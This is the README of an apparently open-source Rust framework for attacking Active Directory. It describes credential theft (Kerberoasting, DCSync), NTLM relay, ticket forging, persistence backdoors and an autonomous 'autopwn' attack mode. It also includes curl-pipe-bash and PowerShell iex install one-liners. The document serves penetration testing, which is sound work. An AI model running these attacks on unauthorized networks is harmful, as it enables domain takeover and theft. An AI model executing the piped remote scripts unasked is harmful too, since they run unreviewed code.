<p align="center">
  <img src="assets/overthrone-banner.png" width="700" alt="overthrone banner" />
</p>

<h1 align="center">Overthrone</h1>

<p align="center">
  <b>Autonomous Active Directory Red Team Framework.</b><br/>
  Every throne falls. Overthrone makes sure of it.
</p>

<p align="center">
  <a href="https://github.com/Karmanya03/Overthrone/releases"><img src="https://img.shields.io/github/v/release/Karmanya03/Overthrone?style=flat-square&color=cc0000" alt="release" /></a>
  <a href="https://github.com/Karmanya03/Overthrone/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-cc0000?style=flat-square" alt="license" /></a>
  <img src="https://img.shields.io/badge/written_in-Rust-cc0000?style=flat-square" alt="rust" />
  <img src="https://img.shields.io/badge/target-Active_Directory-cc0000?style=flat-square" alt="AD" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/enumeration-LDAP_SMB_Kerberos-blueviolet?style=flat-square" alt="protocols" />
  <img src="https://img.shields.io/badge/attack_graph-BloodHound_style-blueviolet?style=flat-square" alt="graph" />
  <img src="https://img.shields.io/badge/lateral_movement-Pass_the_Hash-blueviolet?style=flat-square" alt="pth" />
  <img src="https://img.shields.io/badge/persistence-Golden_Ticket-blueviolet?style=flat-square" alt="persistence" />
  <img src="https://img.shields.io/badge/reporting-Markdown_PDF_JSON-blueviolet?style=flat-square" alt="reports" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/mimikatz-not_needed-ff4444?style=flat-square" alt="no mimikatz" />
  <img src="https://img.shields.io/badge/python-not_needed-ff4444?style=flat-square" alt="no python" />
  <img src="https://img.shields.io/badge/.NET-not_needed-ff4444?style=flat-square" alt="no dotnet" />
  <img src="https://img.shields.io/badge/wine-not_needed-ff4444?style=flat-square" alt="no wine" />
  <img src="https://img.shields.io/badge/binary-overthrone_or_ovt-00cc66?style=flat-square" alt="ovt shorthand" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Rust_LoC-57,000+-informational?style=flat-square" alt="lines of code" />
  <img src="https://img.shields.io/badge/tests-231_passing-brightgreen?style=flat-square" alt="tests" />
  <img src="https://img.shields.io/badge/crates-9_workspace-blue?style=flat-square" alt="crates" />
  <img src="https://img.shields.io/badge/todo!()_macros-only_3-orange?style=flat-square" alt="todos" />
</p>

***

## What is this?

You know how in medieval warfare, taking a castle required siege engineers, scouts, cavalry, archers, sappers, and someone to open the gate from inside? Active Directory pentesting is exactly that, except the castle is a Fortune 500 company, the gate is a misconfigured Group Policy, and the "someone inside" is a service account with `Password123!` that hasn't been rotated since Windows Server 2008 was considered modern.

Overthrone is a full-spectrum AD red team framework that handles the entire kill chain — from "I have network access and a dream" to "I own every domain in this forest and here's a 47-page PDF proving it." Built in Rust because C2 frameworks deserve memory safety too, and because debugging use-after-free bugs during an engagement is how you develop trust issues (both the Active Directory kind and the personal kind).

This is not a scanner. This is not a "run Mimikatz but in Rust" tool. This is not another Python wrapper that breaks when you look at it funny. This is the whole siege engine. One binary. Zero dependencies\*. All regret (for the blue team).

> **Shorthand:** Every command works with both `overthrone` and `ovt`. Because life is too short to type 10 characters when 3 will do. `ovt autopwn` = `overthrone autopwn`. Same war crimes against Active Directory, fewer keystrokes.

\*Okay, one dependency. `smbclient`. We'll explain later. Don't @ us.

### The Kill Chain

```
  YOU                        OVERTHRONE                        DOMAIN CONTROLLER
   |                              |                                    |
   |   ovt autopwn                |                                    |
   |----------------------------->|                                    |
   |                              |                                    |
   |   Phase 1: RECON             |                                    |
   |   ├─ LDAP enumeration ------>|------ Who are you people? -------->|
   |   ├─ Users, groups, GPOs     |<----- Here's literally everything -|
   |   ├─ Kerberoastable SPNs     |       (AD has no chill)            |
   |   ├─ AS-REP roastable accts  |                                    |
   |   └─ Domain trusts           |                                    |
   |                              |                                    |
   |   Phase 2: GRAPH             |                                    |
   |   ├─ Build attack graph      |                                    |
   |   ├─ Find shortest path      |                                    |
   |   │   to Domain Admin        |                                    |
   |   └─ "Oh look, 3 hops.      |                                    |
   |       That's... concerning." |                                    |
   |                              |                                    |
   |   Phase 3: EXPLOIT           |                                    |
   |   ├─ Kerberoast that SPN --->|------ TGS-REQ for MSSQLSvc ------>|
   |   ├─ Crack offline           |<----- Here's a ticket, help urself |
   |   ├─ Pass-the-Hash --------->|------ SMB auth with NT hash ------>|
   |   └─ Lateral move            |       (the hash IS the password)   |
   |                              |                                    |
   |   Phase 4: PERSIST           |                                    |
   |   ├─ DCSync ---------------->|------ Replicate me everything ---->|
   |   ├─ Golden Ticket           |<----- krbtgt hash, as requested ---|
   |   └─ You own the forest.     |       (hope you enjoyed your reign)|
   |       The forest doesn't     |                                    |
   |       know yet.              |                                    |
   |                              |                                    |
   |   Phase 5: REPORT            |                                    |
   |   └─ PDF that makes the      |                                    |
   |      blue team question      |                                    |
   |      their career choices    |                                    |
   V                              V                                    V
```

## Architecture

Overthrone is a Rust workspace with 9 crates, because monoliths are for cathedrals, not offensive tooling. Each crate handles one phase of making sysadmins regret their GPO configurations:

```
overthrone/
├── crates/
│   ├── overthrone-core       # The brain — LDAP, Kerberos, SMB, NTLM, DRSR, MSSQL, ADCS, graph engine
│   ├── overthrone-reaper     # Enumeration — finds everything AD will confess (users, groups, ACLs, LAPS, GPP)
│   ├── overthrone-hunter     # Exploitation — Kerberoast, ASREPRoast, coercion, delegation abuse
│   ├── overthrone-crawler    # Cross-domain — trust mapping, inter-realm tickets, SID filtering, MSSQL links
│   ├── overthrone-forge      # Persistence — Golden/Silver/Diamond tickets, DCSync, Shadow Creds, ACL backdoors
│   ├── overthrone-pilot      # The autopilot — autonomous "hold my beer" mode with adaptive planning
│   ├── overthrone-relay      # NTLM relay — poisoning, responder, ADCS relay. The man-in-the-middle crate.
│   ├── overthrone-scribe     # Reporting — turns carnage into compliance documents (Markdown, PDF, JSON)
│   └── overthrone-cli        # The CLI + TUI — where you type things and thrones fall
```

### What Each Crate Does (Honest Edition™)

| Crate | Codename | LoC | Purpose | The Honest Truth |
|---|---|---|---|---|
| `overthrone-core` | The Foundation | ~15,000 | Protocol engine (LDAP, Kerberos, SMB, NTLM, MS-DRSR, MSSQL, DNS, Registry), attack graph, port scanner, ADCS, crypto, C2 traits, plugin system, remote exec | The absolute unit. 14 submodules. Real protocol implementations talking raw bytes. The borrow checker suffered so your engagements could prosper. Has 5 crypto stub files that are literally one-line comments pretending to be code — `aes_cts.rs` is 1 line and that line is a doc comment. The audacity. |
| `overthrone-reaper` | The Collector | ~2,500 | AD enumeration — users, groups, computers, ACLs, delegations, GPOs, OUs, SPNs, trusts, LAPS, GPP passwords, MSSQL, ADCS | BloodHound's data collection arc but without the Neo4j database eating RAM like it's Thanksgiving. LAPS v1 & v2 plaintext work great. LAPS v2 encrypted? "TODO: Implement once overthrone-core has a DPAPI module." The DPAPI module does not exist. It's on vacation. Indefinitely. |
| `overthrone-hunter` | The Executioner | ~3,500 | Kerberoasting, AS-REP roasting, auth coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce), RBCD abuse, constrained/unconstrained delegation, ticket manipulation, inline hash cracking | The most complete crate. Every module is implemented. Every attack works. Zero `todo!()` macros. This crate graduated top of its class. Valedictorian energy. The crate the other crates aspire to be when they grow up. |
| `overthrone-crawler` | The Explorer | ~2,800 | Cross-domain trust mapping, inter-realm TGT forging, SID filter analysis, PAM trust detection, MSSQL linked server crawling, cross-domain escalation | Trust graph, inter-realm tickets, SID filtering — all solid. But `foreign.rs` has 5 functions that all do the same thing: log a warning and return empty. "LDAP not yet implemented." Five times. It's not a bug, it's a pattern — the pattern of procrastination. |
| `overthrone-forge` | The Blacksmith | ~4,200 | Golden/Silver/Diamond ticket forging, DCSync per-user, Shadow Credentials, ACL backdoors, Skeleton Key orchestration, DSRM backdoor, forensic cleanup & validation | Golden Tickets? Forged. Silver Tickets? Minted. Diamond Tickets? Polished. Shadow Credentials? Well... the LDAP part works, but PKINIT auth is a "placeholder" — the code literally says "placeholder PEM structures" and "placeholder key pair." It's a placeholder wearing a trench coat pretending to be implementation. |
| `overthrone-pilot` | The Strategist | ~5,900 | Autonomous attack planning, goal-based execution, adaptive strategy, engagement state management, playbooks, wizard mode | 2,519-line `executor.rs`. This crate is the "hold my beer" engine. Planner, executor, adaptive strategy — all genuinely implemented. Has a few `placeholder` strings in the SPN generation (it formats SPNs as `"placeholder/{account}"`). The crate that decides what to hack next. Usually decides correctly. |
| `overthrone-relay` | The Interceptor | ~4,100 | NTLM relay engine (SMB/LDAP/HTTP targets), LLMNR/NBT-NS/mDNS poisoner, ADCS-specific relay (ESC8) | The newest member of the family and it came out swinging. Full NTLM relay, multi-protocol poisoning, ADCS relay. 1,560 lines just for `relay.rs`. Responder.py walked so this crate could sprint. In Rust. Without the GIL. |
| `overthrone-scribe` | The Chronicler | ~2,700 | Report generation — Markdown, PDF, JSON. MITRE ATT&CK mapping, mitigation recommendations, attack narrative prose, session recording | Turns "I hacked everything" into "here's why you should pay us." Markdown and JSON output work via CLI. PDF renderer exists in the crate (437 lines of custom PDF generation!) but the CLI says "PDF output not yet implemented." The code exists. The wiring doesn't. It's like owning a Ferrari but losing the keys. |
| `overthrone-cli` | The Interface | ~8,300 | CLI binary, interactive REPL shell, TUI with attack graph visualization, wizard mode, doctor command, autopwn | 2,470-line interactive shell. 2,007-line main.rs. The TUI has a live attack graph view. The `doctor` command checks your setup. C2 implant deployment has a TODO comment. The banner ASCII art is *chef's kiss*. We spent more time on terminal aesthetics than we'd like to admit. (This is not an exaggeration.) |

### The Crate Report Card

Because every crate deserves honest feedback, even if it hurts. Especially if it hurts.

```
overthrone-core     ████████████████████░░  ~85%  The valedictorian with 5 blank exam answers (crypto stubs)
overthrone-reaper   █████████████████████░  ~92%  Just needs DPAPI. So close and yet so DPAPI.
overthrone-hunter   ██████████████████████  100%  The overachiever. No notes. Perfect attendance.
overthrone-crawler  ████████████████░░░░░░  ~72%  foreign.rs is carrying 5 IOUs instead of implementations
overthrone-forge    ██████████████████░░░░  ~88%  Shadow Creds PKINIT: "I'll implement it tomorrow" —2024
overthrone-pilot    █████████████████████░  ~93%  A few placeholder SPNs away from perfection
overthrone-relay    ██████████████████████  100%  Born yesterday, already complete. Prodigy crate.
overthrone-scribe   █████████████████████░  ~95%  PDF is built but not wired. The keys are in the other jacket.
overthrone-cli      █████████████████████░  ~93%  C2 deploy wiring + TUI crawler = homework due next week
```

## The Skeleton Closet (What's Actually Not Done Yet)

Every framework has skeletons. Ours are well-documented and honestly labeled. This section exists because we believe in radical transparency. Also because someone ran a code audit and we can't pretend anymore.

### The Empty Files Hall of Shame 🏆

Five files in `overthrone-core/src/crypto/` contain exactly ONE line each. That line is a doc comment. They are, in order of audacity:

| File | Content (yes, this is the entire file) | What It Should Be |
|---|---|---|
| `aes_cts.rs` | `//! AES256-CTS-HMAC-SHA1 for Kerberos etype 17/18` | AES-CTS encryption for Kerberos. You know, the thing that makes modern tickets work. |
| `hmac_util.rs` | `//! HMAC utilities for ticket validation` | HMAC computation for ticket integrity. Kind of important. |
| `md4.rs` | `//! MD4 hash for NTLM password hashing` | MD4 hashing. The algorithm from 1990 that refuses to die, much like the NTLM protocol itself. |
| `rc4_util.rs` | `//! RC4 encryption for Kerberos etype 23` | RC4 for legacy Kerberos. The crypto equivalent of a screen door on a submarine. |
| `ticket.rs` | `//! Ticket forging: Golden, Silver, Diamond` | Ticket crypto primitives. The irony of `overthrone-forge` working without this is not lost on us. |

These files have been "coming soon" longer than Winds of Winter. George R.R. Martin writes faster than we implement crypto utilities. At least our stubs compile.

### The `todo!()` Trio 🎭

Three `RemoteExecutor::execute()` implementations contain `todo!()` — Rust's way of saying "I'll do it later" while panicking at runtime:

| Module | What Works | What Doesn't | Analogy |
|---|---|---|---|
| `PsExec` (`exec/psexec.rs`) | ~500 lines of real DCE/RPC bind packet building, service creation logic | The actual `execute()` trait method: `todo!("PsExec implementation")` | A fully assembled car with no steering wheel |
| `SmbExec` (`exec/smbexec.rs`) | Service creation via named pipes | `execute()` → `todo!("SmbExec implementation")` | A loaded gun with no trigger |
| `WmiExec` (`exec/wmiexec.rs`) | SCM fallback path, DCOM packet building | `execute()` → `todo!("WmiExec implementation")`. Also: "Full DCOM/WMI not yet implemented" | A rocket ship with a "insert engine here" sticker |

The irony: WinRM (`exec/winrm/wsman.rs`, 480 lines) works perfectly from Linux/macOS. The exec methods that *sound* simpler are the broken ones. Software development is a humbling experience.

### The Placeholder Hall of Participation Trophies 🥉

| Feature | Location | Status | The Excuse |
|---|---|---|---|
| **C2: Sliver** | `core/src/c2/sliver.rs` | 416 lines of struct + trait impl that returns hardcoded `Ok()` | "gRPC integration is coming" — the commit message, 6 months ago |
| **C2: Cobalt Strike** | `core/src/c2/cobalt_strike.rs` | TCP stream field exists, `execute_assembly()` returns `Err("requires mutable access")` | The mutable access was the friends we made along the way |
| **C2: Havoc** | `core/src/c2/havoc.rs` | REST API structure present, actual API calls are vibes-based | It connects to localhost and believes in itself |
| **Shadow Creds PKINIT** | `forge/src/shadow_credentials.rs` | msDS-KeyCredentialLink LDAP manipulation works; PKINIT auth uses "placeholder PEM structures" | The keys are placeholder. The certificates are placeholder. The authentication is placeholder. At this point the file IS the placeholder. |
| **WASM Plugin Loader** | `core/src/plugin/loader.rs` | Native DLL loading works; WASM section: "TODO: Initialize wasmtime::Engine" | We added wasmtime to Cargo.toml and called it a day. Spiritually complete. |
| **Foreign LDAP Queries** | `crawler/src/foreign.rs` | 5 functions, 0 implementations, 5 identical warnings: "LDAP not yet implemented" | Copy-paste consistency is also a skill |
| **LAPS v2 Encrypted** | `reaper/src/laps.rs` | "TODO: Implement once overthrone-core has a DPAPI module" | Waiting for a module that doesn't exist in a crate that doesn't know it's expected to have it. Kafka would be proud. |
| **ADCS ESC1/2/3/6** | `core/src/adcs/` | Files literally do not exist. ESC4, 5, 7, 8 are implemented. | We skipped 1, 2, 3, and 6 like they're floors in a haunted hotel. ESC1 is the most common ADCS attack vector. We chose violence (by omission). |
| **WinRM Win32 Output** | `exec/winrm/windows.rs` | Returns `"(WinRM output collection not yet implemented)"` | The command executes. The output... goes somewhere. Probably. |
| **C2 Implant Deploy** | `cli/src/main.rs:1361` | `// TODO: Construct ImplantRequest and wire to C2Manager.deploy_implant()` | The TODO is the implementation and the implementation is the TODO. Ouroboros. |
| **CLI PDF Output** | `cli/src/commands_impl.rs` | Prints "PDF output not yet implemented, use Markdown or JSON" despite `overthrone-scribe` having a full 437-line PDF renderer | Left hand, meet right hand. Right hand, stop ignoring left hand. |
| **TUI Crawler** | `cli/src/tui/runner.rs` | `// TODO: Integrate actual crawler when available` | The crawler is available. It's in the next crate over. They've never met. |
| **SCCM Module** | `core/src/sccm/mod.rs` | 494 lines, Windows-only WMI path, cross-platform incomplete | Works if you're on Windows. "Works on my machine" has never been more literal. |

## Features

### Enumeration (overthrone-reaper)

The "ask nicely and receive everything" phase. Active Directory is the most oversharing protocol since your aunt discovered Facebook.

| Feature | What it finds | Status |
|---|---|---|
| **Full LDAP enumeration** | Every user, computer, group, OU, and GPO in the domain. AD is surprisingly chatty with authenticated users. It's like a bartender who tells you everyone's secrets after one drink. | ✅ 1,173 lines of LDAP |
| **Kerberoastable accounts** | Service accounts with SPNs. These are the ones with passwords that haven't been changed since someone thought "qwerty123" was secure. | ✅ Works |
| **AS-REP roastable accounts** | Accounts that don't require pre-authentication. Someone literally unchecked a security checkbox. On purpose. In production. We can't make this stuff up. | ✅ Works |
| **Domain trusts** | Parent/child, cross-forest, bidirectional. The map of "who trusts whom" and more importantly, "who shouldn't." Trust is a vulnerability. | ✅ Works |
| **ACL analysis** | GenericAll, WriteDACL, WriteOwner — the holy trinity of "this service account can do WHAT?" The answer is usually "everything" and the IT team usually says "that's by design." | ✅ 315 lines |
| **Delegation discovery** | Unconstrained, constrained, resource-based. Delegation is AD's way of saying "I trust this computer to impersonate anyone." Microsoft calls this a feature. We call it job security. | ✅ Works |
| **Password policy** | Lockout thresholds, complexity requirements, history. Know the rules before you break them. Knowing they require 8 characters with complexity tells you most passwords end in `!` or `1`. | ✅ Works |
| **LAPS discovery** | Which computers have Local Admin Password Solution. LAPS v1 plaintext and v2 JSON work. v2 encrypted (CNG-DPAPI) is awaiting a DPAPI module that may arrive before Half-Life 3. Maybe. | ⚠️ v1/v2 plain ✅, v2 encrypted ❌ |
| **GPP Passwords** | Fetches GPP XML from SYSVOL over SMB, decrypts cpassword values. Microsoft published the AES key. In their documentation. On purpose. We didn't even have to hack anything. | ✅ 243 lines |
| **MSSQL Enumeration** | MSSQL instances, linked servers, xp_cmdshell availability. SQL Server: because every network needs at least one database with `sa:sa` credentials. | ✅ Full TDS + auth |
| **ADCS Enumeration** | Certificate templates, enrollment services, CA permissions. ADCS is the gift that keeps on giving (to attackers). | ✅ 625 lines LDAP enum |

### Attack Execution (overthrone-hunter)

The crate with zero `todo!()` macros. The only crate that did all its homework. If overthrone-hunter were a student, it would remind the teacher about the assignment.

| Attack | How it works | Why it works | Status |
|---|---|---|---|
| **Kerberoasting** | Request TGS tickets for SPN accounts, crack offline with embedded wordlist or hashcat | Service accounts + weak passwords + RC4 encryption = game over. The DC hands you encrypted tickets and says "good luck cracking these" and hashcat says "lol." | ✅ Full (311 lines + 878 line cracker) |
| **AS-REP Roasting** | Request AS-REP for accounts without pre-auth, crack offline | Someone unchecked "Do not require Kerberos preauthentication." That single checkbox has caused more breaches than we can count. | ✅ Full (278 lines) |
| **Auth Coercion** | PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce — make machines authenticate to you | Force a DC to send its NTLM hash to your relay. The DC does this willingly. Microsoft considers this "working as intended" (narrator: it was not). | ✅ Full (799 lines, 5 techniques) |
| **RBCD Abuse** | Modify msDS-AllowedToActOnBehalfOfOtherIdentity to impersonate admins | Resource-Based Constrained Delegation: the attack with the longest name and the shortest time-to-DA. | ✅ Full (372 lines) |
| **Constrained Delegation** | S4U2Self + S4U2Proxy to impersonate users to specific services | Microsoft: "You can only impersonate to these services." Attackers: "What about these other services?" Microsoft: "..." | ✅ Full (335 lines) |
| **Unconstrained Delegation** | Steal TGTs from anyone who authenticates to a compromised machine | The print server has unconstrained delegation. It's always the print server. PrintNightmare was not an accident, it was destiny. | ✅ Full (196 lines) |
| **Inline Hash Cracking** | Embedded top-10K wordlist (zstd compressed), rayon parallel cracking, rule engine (leet, append year/digits, capitalize), hashcat subprocess fallback | Crack AS-REP and Kerberoast hashes without leaving the framework. Your GPU thanks you. Your electricity bill does not. | ✅ Full (878 lines, 231 tests) |
| **Ticket Manipulation** | Request, cache, convert between .kirbi and .ccache formats | Tickets are the currency of Active Directory. This module is the money printer. It goes brrr. | ✅ Full (795 lines) |

### Attack Graph (overthrone-core)

The attack graph engine is basically BloodHound rebuilt in Rust without the Neo4j dependency that eats 4GB of RAM for breakfast and asks for seconds. It maps every relationship in the domain and finds the shortest path to making the blue team update their resumes.

| Feature | Details | Status |
|---|---|---|
| **Directed graph** | Nodes (users, computers, groups, domains) and edges (MemberOf, AdminTo, HasSession, GenericAll, etc.) — it's LinkedIn for attack paths. | ✅ 1,349 lines, petgraph |
| **Shortest path** | Dijkstra with weighted edges — `MemberOf` is free, `AdminTo` costs 1, `HasSpn` costs 5 (offline cracking). It finds the path of least resistance. Just like a real attacker. Just like water. We are water. | ✅ Full |
| **Path to DA** | Finds every shortest path from a compromised user to Domain Admins. Usually shorter than you'd expect. Usually terrifyingly short. | ✅ Full |
| **High-value targets** | Auto-identifies Domain Admins, Enterprise Admins, Schema Admins, KRBTGT, DC computer accounts. The "if you compromise these, the game is over" list. | ✅ Full |
| **Kerberoast reachability** | "From user X, which Kerberoastable accounts can I reach, and how?" — it's a shopping list for your GPU. | ✅ Full |
| **Delegation reachability** | "From user X, which unconstrained delegation machines are reachable?" (Spoiler: it's usually the print server.) | ✅ Full |
| **JSON export** | Full graph export for D3.js, Cytoscape, or your visualization tool of choice. Clients love graphs that look like conspiracy boards. | ✅ Full |
| **Degree centrality** | Find the nodes with the most connections. These are either Domain Admins or the IT intern's test account that somehow has GenericAll on the entire domain. | ✅ Full |

### NTLM Relay & Poisoning (overthrone-relay)

The newest crate, and somehow the most complete. Born with a silver spoon and zero `todo!()` macros. overthrone-relay said "I'm not here to play, I'm here to win" and meant it.

| Feature | Details | Status |
|---|---|---|
| **NTLM Relay Engine** | Full relay — capture NTLM auth from one protocol, replay to another. SMB → LDAP, HTTP → SMB, mix and match like a deadly cocktail. 1,560 lines of pure relay chaos. | ✅ Full |
| **LLMNR/NBT-NS/mDNS Poisoner** | Respond to broadcast name resolution queries. "Who is FILESERVER?" "Me. I'm FILESERVER now." Identity theft, but for computers. | ✅ 840 lines |
| **Network Poisoner** | The engine that decides when to poison, what to poison, and how aggressively to do it while avoiding detection. Subtlety is an art form. | ✅ 765 lines |
| **ADCS Relay (ESC8)** | Relay NTLM auth to AD Certificate Services web enrollment. Get a certificate as the victim. Certificates: the new hashes. | ✅ 359 lines |

### Persistence (overthrone-forge)

Taking the throne is easy. Keeping it is an art form. This crate welds the crown to your head. (Except for Shadow Credentials PKINIT, which welds a placeholder to your head.)

| Technique | What it does | Status | The Catch |
|---|---|---|---|
| **DCSync** | Replicate credentials from the DC using MS-DRSR. Get every hash in the domain. Every. Single. One. The CEO's. The intern's. The service account from 2009 that nobody remembers creating. | ✅ 685 lines | None. This just works. |
| **Golden Ticket** | Forge a TGT signed with the KRBTGT hash. Be any user. Access anything. The Willy Wonka golden ticket, except the chocolate factory is Active Directory. | ✅ 753 lines, full PAC construction | None. Ship it. |
| **Silver Ticket** | Forge a TGS for a specific service. Stealthier than Golden — no DC interaction needed. | ✅ 150 lines | None. Clean. |
| **Diamond Ticket** | Modify a legit TGT's PAC. Bypasses detections that check for TGTs not issued by the KDC. The stealth bomber of ticket forging. | ✅ 159 lines | None. *Chef's kiss.* |
| **Shadow Credentials** | Add a key credential to msDS-KeyCredentialLink via LDAP, then authenticate with the key. The cool modern attack. | ⚠️ LDAP works, PKINIT is placeholder | The LDAP manipulation is real. The PKINIT auth generates "placeholder PEM structures." So you can add the credential but can't use it. It's like having a key that fits the lock but is made of chocolate. |
| **ACL Backdoor** | Modify DACLs to grant yourself hidden permissions. The "I was always an admin, you just didn't notice" technique. | ✅ 442 lines | None. |
| **Skeleton Key** | Patch LSASS to accept a master password. Orchestration-only (needs C2 session on DC). The code correctly says "you need a C2 session for this." Honest king behavior. | ✅ 155 lines (orchestration) | Requires C2 session. By design. |
| **DSRM Backdoor** | Set DsrmAdminLogonBehavior=2 via registry. Persistent backdoor via DSRM Administrator. | ✅ 101 lines | None. |
| **Forensic Cleanup** | Rollback every persistence technique. Because good pentesters clean up after themselves. Great pentesters never needed to. | ✅ 584 lines | None. |
| **Validation** | Verify persistence actually works post-deployment. Trust but verify. (Actually, just verify. This is offensive security.) | ✅ 391 lines | None. |

### ADCS Exploitation (overthrone-core)

AD Certificate Services: where Microsoft said "let's add PKI to Active Directory" and attackers said "thank you for your service."

| ESC | Attack | Status | Notes |
|---|---|---|---|
| **ESC1** | Enrollee supplies subject / SAN in request | ❌ **Not implemented** | The most common ADCS attack vector. We skipped it. Like skipping leg day but for exploitation. |
| **ESC2** | Any purpose EKU + enrollee supplies subject | ❌ **Not implemented** | ESC1's cousin. Also skipped. Family reunion got cancelled. |
| **ESC3** | Enrollment agent + second template abuse | ❌ **Not implemented** | The two-step dance we haven't choreographed yet. |
| **ESC4** | Vulnerable template ACLs → modify to ESC1 | ✅ **663 lines** | Full implementation. Modify template permissions, then exploit. |
| **ESC5** | Vulnerable PKI object permissions | ✅ **394 lines** | Implemented. |
| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | ❌ **Not implemented** | Another missing file. The CA flag check we forgot to check. |
| **ESC7** | CA access control abuse (ManageCA rights) | ✅ **123 lines** | Command generation for CA permission manipulation. |
| **ESC8** | Web enrollment NTLM relay | ✅ **372 lines + relay crate** | Full implementation including the relay engine. |

We implemented 4, 5, 7, 8 and skipped 1, 2, 3, 6. In the world of ADCS, that's like studying for the exam but only the odd-numbered questions. We'll catch the even ones. Eventually.

### Remote Execution (overthrone-core)

The lateral movement engine. Five methods, two working, one perfect, two decorative, and one that returns its output as a string literal. We contain multitudes.

| Method | Protocol | Status | The Honest Truth |
|---|---|---|---|
| **WinRM (Linux/macOS)** | WS-Management + NTLM | ✅ **480 lines, fully implemented** | Pure Rust WS-Man with NTLM auth. Create shell, execute, receive output, delete shell. The one that actually works perfectly. Our golden child. |
| **WinRM (Windows)** | Win32 WSMan API | ⚠️ **169 lines, partial** | Commands execute. Output collection returns `"(WinRM output collection not yet implemented)"`. The command runs. You just... don't get to see what happened. Schrödinger's remote execution. |
| **AtExec** | ATSVC over SMB | ✅ **529 lines, implemented** | Scheduled task creation via named pipe. The classic "Task Scheduler is a feature, not a vulnerability" move. Works. |
| **PsExec** | DCE/RPC + SMB | ⚠️ **509 lines, partial** | ~500 lines of real DCE/RPC bind packet building and service creation logic. The `execute()` method: `todo!()`. A sports car with no steering wheel. It revs beautifully though. |
| **SmbExec** | SCM over SMB | ⚠️ **233 lines, partial** | Service creation works. `execute()` → `todo!()`. See above, but it's a sedan instead of a sports car. |
| **WmiExec** | DCOM/WMI | ⚠️ **374 lines, partial** | Has an SCM fallback path. Main path: `todo!()`. Also admits: "Full DCOM/WMI not yet implemented." Points for honesty. We respect the self-awareness. |

### Autonomous Planning (overthrone-pilot)

The "I'll hack it myself" engine. 5,900 lines of "hold my beer, watch this."

| Feature | Lines | Status |
|---|---|---|
| **Attack Planner** | 507 | ✅ Plans multi-step attack chains from enumeration data |
| **Step Executor** | 2,519 | ✅ Executes each planned step by calling Hunter/Forge/Reaper |
| **Adaptive Strategy** | 696 | ✅ Adjusts plan on-the-fly based on what succeeds and fails |
| **Goal System** | 519 | ✅ Target DA, Enterprise Admin, specific user, specific host |
| **Playbooks** | 287 | ✅ Pre-built attack sequences for common scenarios |
| **Wizard Mode** | 671 | ✅ Interactive guided mode for manual control with autopilot assist |
| **AutoPwn Runner** | 730 | ✅ Full engagement orchestrator: enum → graph → exploit → persist → report |

### Reporting (overthrone-scribe)

The difference between a penetration test and a crime is paperwork. This crate does the paperwork.

| Format | Use case | Status |
|---|---|---|
| **Markdown** | Technical report with findings, attack paths, and mitigations. For the team that actually has to fix things. | ✅ Works via CLI |
| **JSON** | Machine-readable for integration with ticketing systems, SIEMs, or your custom "how screwed are we" dashboard. | ✅ Works via CLI |
| **PDF** | Executive summary for people who think "Domain Admin" is a job title. Custom 437-line PDF renderer. | ⚠️ Scribe has the code. CLI refuses to call it. They're in a fight. |

Every report includes: findings with severity, full attack paths with hop-by-hop details, affected assets, MITRE ATT&CK mappings, remediation steps, mitigation recommendations, and attack narrative prose. Because "GenericAll on the Domain Object via nested group membership through a misconfigured ACE" means nothing to a CISO. "Anyone in marketing can become Domain Admin in 3 steps" does. That sentence has ended careers.

### C2 Framework Integration (overthrone-core)

The C2 integration story is... aspirational. Think of it as a movie trailer. It shows you exciting scenes. The movie is still in post-production.

| Framework | Lines | What Works | What Doesn't |
|---|---|---|---|
| **Sliver** | 416 | Struct definition, trait implementation, operator config parsing | Every function returns hardcoded `Ok()`. It doesn't actually connect to Sliver. It just... *believes* it connected. Manifestation-based C2 integration. |
| **Cobalt Strike** | 328 | TCP stream field, beacon struct, `CsBeacon` type definitions | `execute_assembly` → `Err("requires mutable access")`. `list_listeners` → empty Vec. The data structures are ready for a party nobody's invited them to. |
| **Havoc** | 265 | REST API client structure, `api_get`/`api_post` helper methods | Connects to URLs. Parses JSON responses. Whether those responses come from an actual Havoc teamserver is between you and God. |

The C2 trait system (`C2Channel`, `C2Framework`, `C2Session`) is legitimately well-designed (445 lines in `c2/mod.rs`). The plumbing is excellent. The water just isn't connected yet.

### Plugin System (overthrone-core)

| Component | Status | Notes |
|---|---|---|
| **Plugin Trait** | ✅ 620 lines | Full plugin API: manifest, capabilities, events, command execution |
| **Native DLL Loading** | ✅ Works | Load .so/.dll plugins at runtime |
| **Built-in Example** | ✅ 329 lines | SmartSpray plugin with lockout avoidance. A complete working example. |
| **WASM Plugin Loader** | ❌ Stub | "TODO: Initialize wasmtime::Engine." Three lines of comments pretending to be an implementation. We added wasmtime to Cargo.toml and called it "spiritual completion." |

## The Numbers Don't Lie

```
  57,000+ lines of Rust (not counting tests or comments bragging about it)
  231     unit tests (overthrone-hunter has the most, because of course it does)
  9       workspace crates
  100+    source files
  168     real TCP/socket call sites (this thing actually talks to networks)
  40+     SMB packet construction sites (raw bytes, hand-crafted, artisanal)
  15      LDAP call sites (ldap3 is doing the heavy lifting and we appreciate it)
  3       todo!() macros (PsExec, SmbExec, WmiExec — the axis of incompletion)
  5       one-line stub files (the crypto module's empty promises)
  0       Python dependencies (we fought the dependency gods and won)
  1       smbclient dependency (we fought smb-rs and it won)
  ∞       mass-produced instant coffee consumed during development
```

## Installation

### One-line install (Linux/macOS)

```bash
curl -fsSL https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.sh | bash
```

Auto-detects your platform, grabs the right binary, installs both `overthrone` and `ovt` to your PATH. Easier than misconfiguring a GPO.

### One-line install (Windows PowerShell)

```powershell
irm https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.ps1 | iex
```

Same thing, but for people who attack Active Directory from inside Active Directory. We respect the audacity.

### Download a binary

Grab the latest from [**Releases**](https://github.com/Karmanya03/Overthrone/releases):

| Platform | Binary | Architecture |
|---|---|---|
| **Windows** | [`overthrone-windows-x86_64.exe`](https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-windows-x86_64.exe) | x86_64 |
